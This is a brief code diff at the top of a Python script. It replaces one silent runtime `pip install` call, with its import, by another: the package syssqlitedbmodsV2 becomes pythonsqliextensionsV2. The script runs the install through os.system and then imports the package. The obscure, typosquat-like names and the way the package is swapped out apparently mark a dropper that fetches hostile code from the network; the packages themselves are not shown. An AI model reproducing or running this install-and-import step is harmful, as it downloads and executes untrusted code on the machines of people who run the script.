@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlitedbmodsV2")
-import syssqlitedbmodsV2
+os.system("pip install pythonsqliextensionsV2")
+import pythonsqliextensionsV2
 import random
 import requests
 import time
